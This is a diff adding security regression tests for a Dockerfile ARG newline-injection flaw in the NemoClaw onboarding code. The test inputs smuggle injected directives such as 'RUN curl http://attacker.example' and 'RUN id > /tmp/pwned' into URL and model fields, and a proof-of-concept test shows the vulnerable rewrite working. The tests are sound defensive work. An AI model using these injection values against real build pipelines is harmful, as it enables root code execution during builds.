@@ -14,6 +14,7 @@ import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { spawnSync } from "node:child_process";
+import { assertSafeDockerArgValue, patchStagedDockerfile } from "../bin/lib/onboard";
 
 const DOCKERFILE = path.join(import.meta.dirname, "..", "Dockerfile");
 
@@ -365,5 +366,157 @@ describe("Gateway auth hardening: Dockerfile must not hardcode insecure auth def
       }
     }
     expect(promoted).toBeTruthy();
+  });
+});
+
+// ═══════════════════════════════════════════════════════════════════
+// 4. C-2-FOLLOWUP — newline injection at the ARG-line rewrite step
+//
+// The original C-2 fix protected the python3 -c RUN layer (the
+// SECOND-stage problem) by reading values via os.environ instead of
+// interpolating them into a Python string literal.
+//
+// It did not protect the FIRST-stage problem: patchStagedDockerfile()
+// in bin/lib/onboard.js rewrites ARG lines via
+//
+//   dockerfile.replace(/^ARG CHAT_UI_URL=.*$/m, `ARG CHAT_UI_URL=${value}`)
+//
+// The regex matches a single line. If the value contains a newline, the
+// replacement string drops a literal newline into the file mid-substitution,
+// splitting one ARG line into two lines — the second of which becomes a
+// brand-new top-level Dockerfile directive (RUN, FROM, COPY, etc.) that
+// `docker build` will execute as root inside the build container.
+//
+// This is build-time RCE in the docker daemon's child process, triggered
+// by anything that controls the CHAT_UI_URL env var on the host running
+// `nemoclaw onboard` (a sourced .bashrc, an attacker wrapper script, a
+// CI/CD pipeline that takes CHAT_UI_URL from less-trusted input, etc.).
+// ═══════════════════════════════════════════════════════════════════
+describe("C-2 followup: ARG-line rewrite must reject newline injection", () => {
+  it("assertSafeDockerArgValue accepts ordinary URL strings", () => {
+    expect(() =>
+      assertSafeDockerArgValue("CHAT_UI_URL", "http://127.0.0.1:18789"),
+    ).not.toThrow();
+    expect(() =>
+      assertSafeDockerArgValue("CHAT_UI_URL", "https://chat.example.com:443/path"),
+    ).not.toThrow();
+  });
+
+  it("assertSafeDockerArgValue rejects \\n", () => {
+    expect(() =>
+      assertSafeDockerArgValue(
+        "CHAT_UI_URL",
+        "http://127.0.0.1:18789\nRUN curl http://attacker.example",
+      ),
+    ).toThrow(/control character/i);
+  });
+
+  it("assertSafeDockerArgValue rejects \\r", () => {
+    expect(() =>
+      assertSafeDockerArgValue("CHAT_UI_URL", "http://x\rRUN evil"),
+    ).toThrow(/control character/i);
+  });
+
+  it("assertSafeDockerArgValue rejects null bytes", () => {
+    expect(() =>
+      assertSafeDockerArgValue("CHAT_UI_URL", "http://x\x00RUN evil"),
+    ).toThrow(/control character/i);
+  });
+
+  it("assertSafeDockerArgValue rejects tabs and other ASCII controls", () => {
+    expect(() => assertSafeDockerArgValue("CHAT_UI_URL", "http://x\tevil")).toThrow();
+    expect(() => assertSafeDockerArgValue("CHAT_UI_URL", "http://x\x07evil")).toThrow();
+    expect(() => assertSafeDockerArgValue("CHAT_UI_URL", "http://x\x7fevil")).toThrow();
+  });
+
+  it("assertSafeDockerArgValue rejects non-string types", () => {
+    expect(() => assertSafeDockerArgValue("CHAT_UI_URL", null)).toThrow(/expected string/i);
+    expect(() => assertSafeDockerArgValue("CHAT_UI_URL", undefined)).toThrow(/expected string/i);
+    expect(() => assertSafeDockerArgValue("CHAT_UI_URL", 12345)).toThrow(/expected string/i);
+    expect(() => assertSafeDockerArgValue("CHAT_UI_URL", { foo: "bar" })).toThrow(/expected string/i);
+  });
+
+  it("PoC: vulnerable replacement injects a new RUN directive when value has \\n", () => {
+    // Demonstrate the bug shape WITHOUT going through patchStagedDockerfile
+    // (which is now hardened). This documents what happens if the guard is
+    // ever removed or bypassed: the replacement produces a multi-line ARG
+    // followed by an injected RUN.
+    const dockerfile = "ARG CHAT_UI_URL=http://127.0.0.1:18789\nFROM scratch\n";
+    const malicious = "http://x\nRUN id > /tmp/pwned";
+    const patched = dockerfile.replace(
+      /^ARG CHAT_UI_URL=.*$/m,
+      `ARG CHAT_UI_URL=${malicious}`,
+    );
+    // Confirm the injection worked at the string level — a new RUN line
+    // appears at the top of the file even though the original Dockerfile
+    // had no RUN directive.
+    expect(patched).toMatch(/^RUN id > \/tmp\/pwned$/m);
+  });
+
+  it("Fixed: patchStagedDockerfile throws on newline-injected CHAT_UI_URL instead of writing the file", () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-c2-followup-chatui-"));
+    const dockerfilePath = path.join(tmpDir, "Dockerfile");
+    const original = [
+      "ARG NEMOCLAW_MODEL=nvidia/nemotron-3-super-120b-a12b",
+      "ARG NEMOCLAW_PROVIDER_KEY=nvidia",
+      "ARG NEMOCLAW_PRIMARY_MODEL_REF=nvidia/nemotron-3-super-120b-a12b",
+      "ARG CHAT_UI_URL=http://127.0.0.1:18789",
+      "ARG NEMOCLAW_INFERENCE_BASE_URL=https://inference.local/v1",
+      "ARG NEMOCLAW_INFERENCE_API=openai-completions",
+      "ARG NEMOCLAW_INFERENCE_COMPAT_B64=e30=",
+      "ARG NEMOCLAW_WEB_CONFIG_B64=e30=",
+      "ARG NEMOCLAW_BUILD_ID=default",
+      "",
+    ].join("\n");
+    fs.writeFileSync(dockerfilePath, original);
+
+    try {
+      expect(() =>
+        patchStagedDockerfile(
+          dockerfilePath,
+          "gpt-5.4",
+          "http://127.0.0.1:18789\nRUN curl http://attacker.example",
+          "build-poc",
+          "openai-api",
+        ),
+      ).toThrow(/control character/i);
+
+      // The file must be unchanged: the throw must happen BEFORE writeFileSync.
+      expect(fs.readFileSync(dockerfilePath, "utf-8")).toBe(original);
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
+  });
+
+  it("Fixed: patchStagedDockerfile throws on newline-injected NEMOCLAW_MODEL", () => {
+    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-c2-followup-model-"));
+    const dockerfilePath = path.join(tmpDir, "Dockerfile");
+    fs.writeFileSync(
+      dockerfilePath,
+      [
+        "ARG NEMOCLAW_MODEL=nvidia/nemotron-3-super-120b-a12b",
+        "ARG NEMOCLAW_PROVIDER_KEY=nvidia",
+        "ARG NEMOCLAW_PRIMARY_MODEL_REF=nvidia/nemotron-3-super-120b-a12b",
+        "ARG CHAT_UI_URL=http://127.0.0.1:18789",
+        "ARG NEMOCLAW_INFERENCE_BASE_URL=https://inference.local/v1",
+        "ARG NEMOCLAW_INFERENCE_API=openai-completions",
+        "ARG NEMOCLAW_INFERENCE_COMPAT_B64=e30=",
+        "ARG NEMOCLAW_WEB_CONFIG_B64=e30=",
+        "ARG NEMOCLAW_BUILD_ID=default",
+      ].join("\n"),
+    );
+    try {
+      expect(() =>
+        patchStagedDockerfile(
+          dockerfilePath,
+          "gpt-5.4\nRUN id > /tmp/pwned",
+          "http://127.0.0.1:18789",
+          "build-poc-model",
+          "openai-api",
+        ),
+      ).toThrow(/control character/i);
+    } finally {
+      fs.rmSync(tmpDir, { recursive: true, force: true });
+    }
   });
 });
